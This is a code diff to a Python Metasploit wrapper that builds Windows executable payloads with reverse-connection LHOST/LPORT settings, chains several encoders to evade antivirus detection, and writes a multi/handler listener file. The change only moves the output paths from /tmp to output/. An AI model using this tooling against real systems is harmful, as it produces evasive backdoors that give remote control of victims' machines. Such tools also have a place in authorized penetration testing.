@@ -79,18 +79,18 @@ while 1:
 		PrintInfo("Creating payload in /tmp. Please wait...")
 		if encoding == '1' or encoding == '':
 			if not selection or selection in ('1','3'):
-				subprocess.Popen("%s/msfpayload %s LHOST=%s LPORT=%s R | %s/msfencode -c 2 -e %s -t raw | %s/msfencode -t raw -e %s -c 2 | %s/msfencode -t raw -e %s -c 2 | %s/msfencode -t exe -c 2 -e %s -o /tmp/%s.exe" % (path, payload, ip, port, path, choice(encoders), path, choice(encoders), path, choice(encoders), path, choice(encoders), filename), shell=True).wait()
+				subprocess.Popen("%s/msfpayload %s LHOST=%s LPORT=%s R | %s/msfencode -c 2 -e %s -t raw | %s/msfencode -t raw -e %s -c 2 | %s/msfencode -t raw -e %s -c 2 | %s/msfencode -t exe -c 2 -e %s -o output/%s.exe" % (path, payload, ip, port, path, choice(encoders), path, choice(encoders), path, choice(encoders), path, choice(encoders), filename), shell=True).wait()
 			else:
-				subprocess.Popen("%s/msfpayload %s LPORT=%s R | %s/msfencode -e x86/shikata_ga_nai -t raw -c 5 | %s/msfencode -t raw -e x86/alpha_upper -c 2 | %s/msfencode -t raw -e x86/shikata_ga_nai -c 5 | %s/msfencode -t exe -c 5 -e x86/countdown -o /tmp/%s.exe" % (path, payload, port, path, path, path, path, filename), shell=True).wait()
+				subprocess.Popen("%s/msfpayload %s LPORT=%s R | %s/msfencode -e x86/shikata_ga_nai -t raw -c 5 | %s/msfencode -t raw -e x86/alpha_upper -c 2 | %s/msfencode -t raw -e x86/shikata_ga_nai -c 5 | %s/msfencode -t exe -c 5 -e x86/countdown -o output/%s.exe" % (path, payload, port, path, path, path, path, filename), shell=True).wait()
 		#
 		# if encoding is 2 then skip encoding
 		# and just create payload
 		#
 		elif encoding == '2':
 			if not selection or selection in ('1','3'):
-				subprocess.Popen("%s/msfpayload %s lhost=%s lport=%s X > /tmp/%s.exe" % (msfpath(), payload, ip, port, filename), shell=True).wait()
+				subprocess.Popen("%s/msfpayload %s lhost=%s lport=%s X > output/%s.exe" % (msfpath(), payload, ip, port, filename), shell=True).wait()
 			else:
-				subprocess.Popen("%s/msfpayload %s lport=%s X > /tmp/%s.exe" % (msfpath(), payload, port, filename), shell=True).wait()
+				subprocess.Popen("%s/msfpayload %s lport=%s X > output/%s.exe" % (msfpath(), payload, port, filename), shell=True).wait()
 			
 		# start multi handler
 		answer = raw_input("\nStart matching handler Y/N? (Default Y) ")
@@ -98,7 +98,7 @@ while 1:
 			
 			PrintInfo("Starting multi handler")
 			# create rc file
-			rcfile = "/tmp/win_listener.rc"
+			rcfile = "output/win_listener.rc"
 			fw = open(rcfile, "w")
 			fw.write("use exploit/multi/handler\n")
 			fw.write("set PAYLOAD %s\n" % payload)
@@ -118,7 +118,7 @@ while 1:
 			
 			PrintInfo("Cleaning up...")
 			os.remove(rcfile)
-			os.remove("/tmp/"+filename+".exe")
+			os.remove("output/"+filename+".exe")
 			sleep(1)
 			EntContinue()
 			# return to main
